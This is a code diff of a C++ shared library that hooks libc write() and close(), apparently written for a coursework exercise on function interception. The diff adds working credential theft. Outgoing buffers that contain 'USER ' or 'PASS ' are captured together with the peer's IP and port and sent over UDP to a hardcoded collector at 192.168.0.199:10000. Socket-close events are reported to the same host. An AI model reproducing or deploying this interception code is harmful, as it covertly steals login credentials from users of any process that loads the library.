@@ -16,21 +16,24 @@ extern "C"
 
 //Task 1
 #include <fstream>
+
 //Task 3
-//#include <socket_wrapper/socket_headers.h>
-//#include <socket_wrapper/socket_wrapper.h>
-//#include <socket_wrapper/socket_class.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netdb.h>
+
+//#include <sys/types.h>
+//#include <sys/socket.h>
+//#include <netinet/in.h>
+//#include <netdb.h>
+//#include <sys/wait.h>
+//#include <signal.h>
+
 #include <arpa/inet.h>
-#include <sys/wait.h>
-#include <signal.h>
 
 #include <iostream>
 #include <cstring>
-#include <cctype>
+
+//#include <socket_wrapper/socket_headers.h>
+//#include <socket_wrapper/socket_wrapper.h>
+//#include <socket_wrapper/socket_class.h>
 
 static void init (void) __attribute__ ((constructor));
 
@@ -44,6 +47,13 @@ static write_t old_write;
 
 static int socket_fd = -1;
 
+// IP адрес сервера для отправки
+char server_address[INET_ADDRSTRLEN]="192.168.0.199";
+// порт сервера для отправки
+static int server_port=10000;
+
+static sockaddr_in serv_addr;
+static int sock = -1;
 
 void init(void)
 {
@@ -57,53 +67,31 @@ void init(void)
     std::ofstream file1;
     file1.open("interception.log");
     file1.close();
+
+    inet_pton(AF_INET, server_address, &(serv_addr.sin_addr));
+    serv_addr.sin_port=htons(server_port);
+    serv_addr.sin_family=PF_INET;
+
+    sock= old_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+//    connect(sock, reinterpret_cast<const sockaddr*>(&serv_addr), sizeof(serv_addr));
 }
-
-
-bool FirstPStr(char* strRez, const char* str)
-{
-    if (strlen(strRez) > strlen(str))
-    {
-        return false;
-    }
-
-    for (int i = 0; i <= strlen(strRez)-1; i++)
-    {
-        if (tolower(strRez[i])!=tolower(str[i])) return false;
-    }
-    return true;
-}
-
 
 extern "C"
 {
 
 int close(int fd)
 {
-    if (fd == socket_fd)
+    if ( fd == socket_fd )
     {
         printf("> close() on the socket was called!\n");
-        std::string cl="Socket close";
 
-        char socket_adr[INET_ADDRSTRLEN] = "";
-        struct sockaddr_in socket_adr_name;
-        socklen_t socket_adr_name_len = sizeof(socket_adr_name);
-
-        if (getpeername(fd, (struct sockaddr *)&socket_adr_name, &socket_adr_name_len) != 0)
-        {
-            perror("getpeername");
-        } else
-          {
-            // Здесь передача не доходит, чем это можно объяснить?
-            sendto(fd, cl.c_str(), cl.length(), 0,reinterpret_cast<const sockaddr *>(&socket_adr_name), sizeof(socket_adr));
-            sleep(1);
-          }
-    }
+        std::string cl="Socket close\n";
+        sendto(sock, cl.c_str(), cl.length(), 0,reinterpret_cast<const sockaddr *>(&serv_addr), sizeof(serv_addr));
         socket_fd = -1;
+    }
 
     return old_close(fd);
 }
-
 
 ssize_t write(int fd, const void *buf, size_t count)
 {
@@ -133,21 +121,20 @@ ssize_t write(int fd, const void *buf, size_t count)
           {
             char *user="USER ";
             char *pass="PASS ";
-            if (FirstPStr(user, char_buf) || FirstPStr(pass, char_buf))
+            if (strstr(char_buf, user) || strstr(char_buf, pass))
             {
                 inet_ntop(AF_INET, &socket_adr_name.sin_addr, socket_adr, sizeof socket_adr);
                 std::string buff = "\nip="+ std::string(socket_adr);
                 uint16_t adr_port=ntohs(socket_adr_name.sin_port);
                 buff = buff + " port=" + std::to_string(adr_port)+'\n';
                 buff = buff + std::string(char_buf,count);
-                sendto(fd, buff.c_str(), buff.length(), 0,reinterpret_cast<const sockaddr *>(&socket_adr_name), sizeof(socket_adr));
+                if (sock)
+                {
+                    sendto(sock, buff.c_str(), buff.length(), 0,reinterpret_cast<const sockaddr *>(&serv_addr), sizeof(serv_addr));
+                }
              }
           }
     }
-// не понятно что еще можно сделать кроме как забить буфер чем то непотребным
-// иначе только ошибки
-    char *c = const_cast<char *>(char_buf);
-    for (int i=0;i<count;i++) c[i]=0;
     return old_write(fd, buf, count);
 }
 
